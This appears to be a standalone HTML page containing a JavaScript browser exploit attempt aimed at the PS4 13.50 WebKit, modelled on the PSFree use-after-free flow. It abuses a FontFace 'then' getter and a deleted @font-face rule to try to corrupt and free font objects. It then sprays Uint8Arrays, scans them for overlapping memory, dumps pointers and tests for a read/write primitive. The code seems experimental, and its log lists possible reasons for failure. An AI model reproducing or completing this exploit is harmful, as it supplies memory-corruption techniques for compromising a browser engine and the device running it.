<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 13.50 - Free + Spray</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        font-family: 'Courier New', monospace;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
        color: #00ff41;
        min-height: 100vh;
        padding: 20px;
    }
    
    .container {
        max-width: 1400px;
        margin: 0 auto;
    }
    
    .header {
        text-align: center;
        padding: 30px 0;
        background: rgba(0, 255, 65, 0.05);
        border: 2px solid #00ff41;
        border-radius: 15px;
        margin-bottom: 30px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
        animation: glow 2s ease-in-out infinite alternate;
    }
    
    @keyframes glow {
        from { box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); }
        to { box-shadow: 0 0 40px rgba(0, 255, 65, 0.6); }
    }
    
    .header h1 {
        font-size: 2.5em;
        text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
        margin-bottom: 10px;
        letter-spacing: 3px;
    }
    
    .header .subtitle {
        font-size: 1.2em;
        color: #00cc33;
        letter-spacing: 2px;
    }
    
    .btn {
        display: block;
        margin: 0 auto 30px;
        padding: 20px 50px;
        font-size: 1.5em;
        font-weight: bold;
        border: 3px solid #00ff41;
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 255, 65, 0.2) 100%);
        color: #00ff41;
        cursor: pointer;
        border-radius: 10px;
        transition: all 0.3s ease;
        font-family: 'Courier New', monospace;
        text-transform: uppercase;
        letter-spacing: 2px;
        box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
    }
    
    .btn:hover {
        background: linear-gradient(135deg, rgba(0, 255, 65, 0.2) 0%, rgba(0, 255, 65, 0.4) 100%);
        box-shadow: 0 8px 25px rgba(0, 255, 65, 0.5);
        transform: translateY(-3px);
    }
    
    .log-container {
        background: rgba(0, 0, 0, 0.8);
        border: 2px solid #00ff41;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
    }
    
    .log-header {
        font-size: 1.2em;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 2px solid #00ff41;
        text-transform: uppercase;
        letter-spacing: 2px;
    }
    
    #log {
        font-size: 0.9em;
        line-height: 1.6;
        max-height: 600px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-wrap: break-word;
        padding: 10px;
        background: rgba(0, 0, 0, 0.5);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar {
        width: 10px;
    }
    
    #log::-webkit-scrollbar-track {
        background: rgba(0, 255, 65, 0.1);
        border-radius: 5px;
    }
    
    #log::-webkit-scrollbar-thumb {
        background: #00ff41;
        border-radius: 5px;
    }
    
    .success { color: #00ff41; font-weight: bold; }
    .error { color: #ff3366; font-weight: bold; }
    .warning { color: #ffaa00; }
    .info { color: #00ccff; }
    .highlight { color: #ff00ff; font-weight: bold; }
</style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>◈ FREE + SPRAY ◈</h1>
        <div class="subtitle">Corrupt → Free → Spray (Complete PSFree flow)</div>
    </div>
    
    <button class="btn" onclick="runExploit()">► EXPLOIT</button>
    
    <div class="log-container">
        <div class="log-header">◈ EXPLOIT LOG ◈</div>
        <div id="log"></div>
    </div>
</div>

<script>
"use strict";

let logBuf = [];

function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.innerHTML = logBuf.map(line => {
            let className = '';
            if (line.includes('[+++]')) className = 'success';
            else if (line.includes('[ERROR]')) className = 'error';
            else if (line.includes('[!]')) className = 'warning';
            else if (line.includes('[+]')) className = 'info';
            else if (line.includes('0x') && line.includes('POINTER')) className = 'highlight';
            
            return `<span class="${className}">${line}</span>`;
        }).join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
    
    read32(u8view, offset) {
        return (
            u8view[offset]
            | u8view[offset + 1] << 8
            | u8view[offset + 2] << 16
            | u8view[offset + 3] << 24
        ) >>> 0;
    }
    
    read64(u8view, offset) {
        let low = this.read32(u8view, offset);
        let high = this.read32(u8view, offset + 4);
        return new Int64(low, high);
    }
}

function runExploit() {
    logBuf = [];
    
    log('═══════════════════════════════════════════════════════');
    log('     PS4 13.50 - CORRUPT → FREE → SPRAY                ');
    log('═══════════════════════════════════════════════════════\n');
    
    log('[STRATEGY] Complete PSFree flow');
    log('[1] Corrupt FontFace structures');
    log('[2] Free corrupted structures');
    log('[3] Spray Uint8Arrays to reclaim memory\n');
    
    // Setup
    let style = document.createElement('style');
    style.id = 's';
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    let floatArray = new Float64Array(100);
    let objectArray = new Array(100);
    
    for (let i = 0; i < 100; i++) {
        floatArray[i] = 1.1 * (i + 1);
        objectArray[i] = { id: i };
    }
    
    log('[SETUP] Arrays created\n');
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                log('[PHASE 1] ▼▼▼ CORRUPTION ▼▼▼\n');
                
                // Create corrupted fonts
                let corrupted = [];
                for (let i = 0; i < 100; i++) {
                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                        unicodeRange: 'U+' + (0x100 + i).toString(16)
                    }));
                }
                
                document.getElementById('s').sheet.deleteRule(0);
                document.body.offsetTop;
                
                log('[*] Created ' + corrupted.length + ' corrupted fonts');
                log('[*] Corruption triggered\n');
                
                // Setup
                log('[SETUP] Tests 1-3...');
                try {
                    corrupted[0].status;
                    corrupted[1].p = {x:1};
                    floatArray[50] = corrupted[2];
                    log('[SETUP] ✓\n');
                } catch(e) {
                    log('[SETUP] !\n');
                }
                
                // ═══════════════════════════════════════════
                // PHASE 2: FREE (like PSFree)
                // ═══════════════════════════════════════════
                
                log('[PHASE 2] ▼▼▼ FREE CORRUPTED STRUCTURES ▼▼▼\n');
                
                log('[*] Removing references to trigger deallocation...');
                
                // Remove from document.fonts
                try {
                    for (let i = 0; i < corrupted.length; i++) {
                        document.fonts.delete(corrupted[i]);
                    }
                    log('[+] Removed ' + corrupted.length + ' fonts from document.fonts');
                } catch(e) {
                    log('[!] Error removing: ' + e.message);
                }
                
                // Clear the array
                corrupted.length = 0;
                corrupted = null;
                
                log('[+] Cleared corrupted array');
                log('[+] Memory should be deallocated\n');
                
                // Force GC
                log('[*] Forcing garbage collection...');
                try {
                    new Uint8Array(10 * 1024 * 1024); // 10MB allocation to trigger GC
                } catch(e) {}
                
                log('[+] GC triggered\n');
                
                // ═══════════════════════════════════════════
                // PHASE 3: SPRAY (like PSFree)
                // ═══════════════════════════════════════════
                
                log('[PHASE 3] ▼▼▼ UINT8ARRAY SPRAY ▼▼▼\n');
                
                let spraySize = 0x50; // Try PSFree's typical size
                let views = [];
                
                log('[*] Spraying ' + hex(spraySize) + ' byte Uint8Arrays...');
                
                for (let i = 0; i < 0x400; i++) {
                    let view = new Uint8Array(new ArrayBuffer(spraySize));
                    
                    // Marker pattern
                    view[0] = 0x41;
                    view[1] = 0x41;
                    view[2] = 0x41;
                    view[3] = 0x41;
                    
                    // Index
                    view[4] = i & 0xFF;
                    view[5] = (i >> 8) & 0xFF;
                    
                    views.push(view);
                }
                
                log('[*] Sprayed ' + views.length + ' views');
                log('[*] Checking for overlaps...\n');
                
                // ═══════════════════════════════════════════
                // CHECK FOR OVERLAPS
                // ═══════════════════════════════════════════
                
                let overlaps = [];
                
                for (let i = 0; i < views.length; i++) {
                    let view = views[i];
                    
                    if (view[0] !== 0x41 || view[1] !== 0x41 || 
                        view[2] !== 0x41 || view[3] !== 0x41) {
                        
                        log('[+++] OVERLAP FOUND at view ' + i + '!');
                        log('  Marker changed to: ' + hex(view[0]) + ' ' + hex(view[1]) + ' ' + hex(view[2]) + ' ' + hex(view[3]));
                        
                        overlaps.push({view: view, index: i});
                    }
                }
                
                if (overlaps.length > 0) {
                    log('\n[+++] FOUND ' + overlaps.length + ' OVERLAPS!\n');
                    
                    for (let j = 0; j < Math.min(2, overlaps.length); j++) {
                        let o = overlaps[j];
                        log('[OVERLAP ' + j + '] Index ' + o.index + ':');
                        
                        // Dump
                        for (let line = 0; line < 4; line++) {
                            let str = '  +' + hex(line * 16) + ': ';
                            for (let k = 0; k < 16; k++) {
                                str += o.view[line * 16 + k].toString(16).padStart(2, '0') + ' ';
                            }
                            log(str);
                        }
                        
                        // Look for pointers
                        let helper = new Int64(0, 0);
                        for (let off = 0; off < 64; off += 8) {
                            let addr = helper.read64(o.view, off);
                            if (addr.high >= 0x01000000 && addr.high <= 0x7fffffff) {
                                log('  +' + hex(off) + ': ' + addr.toString() + ' [POINTER]');
                            }
                        }
                        
                        log('');
                    }
                    
                    // Test write
                    log('[TEST] Writing to first overlap...');
                    let testView = overlaps[0].view;
                    testView[0] = 0xDE;
                    testView[1] = 0xAD;
                    testView[2] = 0xBE;
                    testView[3] = 0xEF;
                    
                    log('[TEST] Read back: ' + hex(testView[0]) + ' ' + hex(testView[1]) + ' ' + hex(testView[2]) + ' ' + hex(testView[3]));
                    
                    if (testView[0] === 0xDE && testView[1] === 0xAD) {
                        log('[+++] WRITE WORKING!\n');
                        log('[SUCCESS] We have R/W primitive!');
                        log('[SUCCESS] Can manipulate corrupted memory!');
                    }
                    
                } else {
                    log('[!] No overlaps found\n');
                    log('[ANALYSIS] Possible reasons:');
                    log('  - Wrong spray size (try 0x48, 0x58, 0x100)');
                    log('  - Font structures not actually freed');
                    log('  - Need different trigger for deallocation');
                }
                
                log('\n[!] Returning - OOM will occur');
                log('═══════════════════════════════════════════════════════\n');
            }
            
            return undefined;
        }
    });
    
    log('[*] Starting...\n');
    document.fonts.load('1em x', 'AB');
}

log('═══════════════════════════════════════════════════════');
log('        FREE + SPRAY READY                             ');
log('═══════════════════════════════════════════════════════\n');
log('[INFO] Complete flow: Corrupt → Free → Spray');
log('[READY] Click EXPLOIT\n');

</script>
</body>
</html>
